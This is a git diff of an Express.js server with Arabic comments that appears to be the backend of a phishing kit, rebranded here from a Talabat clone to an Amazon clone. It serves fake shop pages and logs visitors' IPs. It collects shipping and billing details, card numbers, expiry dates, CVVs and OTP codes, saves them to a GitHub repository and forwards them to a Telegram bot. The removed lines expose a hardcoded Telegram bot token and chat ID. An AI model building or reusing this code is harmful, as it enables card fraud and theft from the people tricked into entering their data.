@@ -3,14 +3,15 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// ========== إعدادات GitHub ==========
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
-const REPO_OWNER = 'afffaaaa28-glitch';
-const REPO_NAME = 'talabat';
-const FILE_PATH = 'talabat-data.txt';
+const REPO_OWNER = 'lya020080-create';
+const REPO_NAME = 'amazon-new'; 
+const FILE_PATH = 'amazon-data.txt'; 
 
-// ========== إعدادات تيلجرام ==========
-const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
-const TELEGRAM_CHAT_ID = '8140097273';
+// ========== إعدادات تيلجرام (من متغيرات البيئة) ==========
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -19,6 +20,10 @@ app.use(express.static(path.join(__dirname, 'views')));
 // ========== دالة إرسال إشعار تيلجرام ==========
 async function sendTelegramMessage(message) {
     try {
+        if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.error('❌ متغيرات تيلجرام غير موجودة');
+            return;
+        }
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
         const response = await fetch(url, {
             method: 'POST',
@@ -43,6 +48,10 @@ async function sendTelegramMessage(message) {
 
 // ========== دالة حفظ على GitHub ==========
 async function saveToGitHub(newData) {
+    if (!GITHUB_TOKEN) {
+        console.error('❌ GITHUB_TOKEN غير موجود');
+        return;
+    }
     const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
     
     let existingContent = '';
@@ -82,6 +91,7 @@ async function saveToGitHub(newData) {
 
 // ========== دالة جلب البيانات من GitHub ==========
 async function fetchFromGitHub() {
+    if (!GITHUB_TOKEN) return '';
     try {
         const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
         const response = await fetch(url, { 
@@ -107,31 +117,6 @@ async function fetchFromGitHub() {
 let cachedData = '';
 let lastFetchTime = 0;
 
-// ========== مسار إشعار الزيارة ==========
-app.post('/api/notify-visit', async (req, res) => {
-    try {
-        const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
-                   req.headers['x-real-ip'] || 
-                   req.socket.remoteAddress || 
-                   'غير معروف';
-        const userAgent = req.headers['user-agent'] || 'غير معروف';
-
-        let msg = `🟢 <b>عميل جديد بدأ التسجيل!</b>\n`;
-        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `🌐 IP: ${ip}\n`;
-        msg += `💻 المتصفح: ${userAgent}\n\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
-
-        await sendTelegramMessage(msg);
-        res.json({ success: true, message: 'تم إرسال الإشعار' });
-    } catch (e) {
-        console.error('❌ خطأ:', e.message);
-        res.json({ success: false, message: e.message });
-    }
-});
-
 // ========== المسارات ==========
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'page1.html'));
@@ -153,27 +138,28 @@ app.get('/page5', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'page5.html'));
 });
 
-// ========== صفحة عرض البيانات ==========
-app.get('/data-viewer', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
-});
-
-// ========== API لجلب البيانات ==========
-app.get('/api/data', async (req, res) => {
+// ========== مسار إشعار الزيارة ==========
+app.post('/api/notify-visit', async (req, res) => {
     try {
-        const now = Date.now();
-        if (now - lastFetchTime > 5000 || !cachedData) {
-            console.log('🔄 جلب بيانات جديدة من GitHub...');
-            cachedData = await fetchFromGitHub();
-            lastFetchTime = now;
-            console.log('✅ تم جلب البيانات، الطول:', cachedData.length);
-        }
-        
-        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-        res.send(cachedData);
+        const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
+                   req.headers['x-real-ip'] || 
+                   req.socket.remoteAddress || 
+                   'غير معروف';
+        const userAgent = req.headers['user-agent'] || 'غير معروف';
+
+        let msg = `🟢 <b>عميل جديد بدأ التسجيل - أمازون</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `🌐 IP: ${ip}\n`;
+        msg += `💻 المتصفح: ${userAgent}\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://amazon-new.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+
+        await sendTelegramMessage(msg);
+        res.json({ success: true, message: 'تم إرسال الإشعار' });
     } catch (e) {
         console.error('❌ خطأ:', e.message);
-        res.send(cachedData || '');
+        res.json({ success: false, message: e.message });
     }
 });
 
@@ -190,7 +176,6 @@ app.post('/submit-data', async (req, res) => {
         logData += '📦 بيانات الشحن:\n';
         logData += '-'.repeat(40) + '\n';
         logData += `الاسم الكامل: ${data.username || 'غير محدد'}\n`;
-        logData += `تاريخ الميلاد: ${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}\n`;
         logData += `رقم الهاتف: ${data.phone || 'غير محدد'}\n`;
         logData += `الدولة: ${data.country || 'غير محدد'}\n`;
         logData += `العنوان: ${data.address_line1 || 'غير محدد'}\n`;
@@ -203,11 +188,8 @@ app.post('/submit-data', async (req, res) => {
         logData += '-'.repeat(40) + '\n';
         logData += `الاسم الكامل: ${data.billing_username || data.billing_username_hidden || 'نفس الشحن'}\n`;
         logData += `العنوان: ${data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن'}\n`;
-        logData += `العنوان (سطر 2): ${data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن'}\n`;
         logData += `المدينة: ${data.billing_city || data.billing_city_hidden || 'نفس الشحن'}\n`;
         logData += `المحافظة: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
-        logData += `الرمز البريدي: ${data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن'}\n`;
-        logData += `رقم الهاتف: ${data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'}\n`;
 
         logData += '\n' + '='.repeat(50) + '\n';
 
@@ -218,32 +200,26 @@ app.post('/submit-data', async (req, res) => {
         lastFetchTime = Date.now();
         
         // ====== إرسال كل البيانات لتيلجرام ======
-        let msg = `📬 <b>بيانات العميل الجديدة - Talabat</b>\n`;
+        let msg = `📬 <b>بيانات العميل الجديدة - Amazon</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         
         msg += `📦 <b>بيانات الشحن:</b>\n`;
         msg += `👤 الاسم الكامل: ${data.username || 'غير محدد'}\n`;
-        msg += `📅 تاريخ الميلاد: ${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}\n`;
         msg += `📞 رقم الهاتف: ${data.phone || 'غير محدد'}\n`;
         msg += `🌍 الدولة: ${data.country || 'غير محدد'}\n`;
         msg += `🏠 العنوان: ${data.address_line1 || 'غير محدد'}\n`;
-        msg += `🏠 العنوان (سطر 2): ${data.address_line2 || 'غير محدد'}\n`;
         msg += `📍 المدينة: ${data.city || 'غير محدد'}\n`;
-        msg += `🏛️ المحافظة: ${data.state || 'غير محدد'}\n`;
-        msg += `📮 الرمز البريدي: ${data.zipcode || 'غير محدد'}\n\n`;
+        msg += `🏛️ المحافظة: ${data.state || 'غير محدد'}\n\n`;
         
         msg += `💳 <b>بيانات الفوترة:</b>\n`;
         msg += `👤 الاسم الكامل: ${data.billing_username || data.billing_username_hidden || 'نفس الشحن'}\n`;
         msg += `🏠 العنوان: ${data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن'}\n`;
-        msg += `🏠 العنوان (سطر 2): ${data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن'}\n`;
         msg += `📍 المدينة: ${data.billing_city || data.billing_city_hidden || 'نفس الشحن'}\n`;
-        msg += `🏛️ المحافظة: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
-        msg += `📮 الرمز البريدي: ${data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن'}\n`;
-        msg += `📞 رقم الهاتف: ${data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'}\n\n`;
+        msg += `🏛️ المحافظة: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n\n`;
         
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+        msg += `🔗 <a href="https://amazon-new.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
         
         await sendTelegramMessage(msg);
         
@@ -276,7 +252,7 @@ app.post('/submit-payment', async (req, res) => {
         lastFetchTime = Date.now();
         
         // ====== إرسال كل بيانات الدفع ======
-        let msg = `💳 <b>بيانات بطاقة الدفع - Talabat</b>\n`;
+        let msg = `💳 <b>بيانات بطاقة الدفع - Amazon</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         msg += `👤 اسم صاحب البطاقة: ${data.card_name || 'غير محدد'}\n`;
@@ -284,7 +260,7 @@ app.post('/submit-payment', async (req, res) => {
         msg += `📅 تاريخ الانتهاء: ${data.card_expiry || 'غير محدد'}\n`;
         msg += `🔐 رمز CVV: ${data.card_cvv || 'غير محدد'}\n\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+        msg += `🔗 <a href="https://amazon-new.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
         
         await sendTelegramMessage(msg);
         
@@ -314,12 +290,12 @@ app.post('/submit-otp', async (req, res) => {
         lastFetchTime = Date.now();
         
         // ====== إرسال OTP ======
-        let msg = `🔐 <b>رمز التحقق OTP - Talabat</b>\n`;
+        let msg = `🔐 <b>رمز التحقق OTP - Amazon</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         msg += `🔢 رمز OTP: ${data.otp_code || 'غير محدد'}\n\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://talabat.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
+        msg += `🔗 <a href="https://amazon-new.vercel.app/data-viewer">📊 عرض جميع البيانات</a>`;
         
         await sendTelegramMessage(msg);
         
@@ -342,4 +318,3 @@ app.listen(PORT, () => {
     console.log(`✅ السيرفر شغال على port ${PORT}`);
     console.log(`📊 صفحة عرض البيانات: http://localhost:${PORT}/data-viewer`);
 });
-
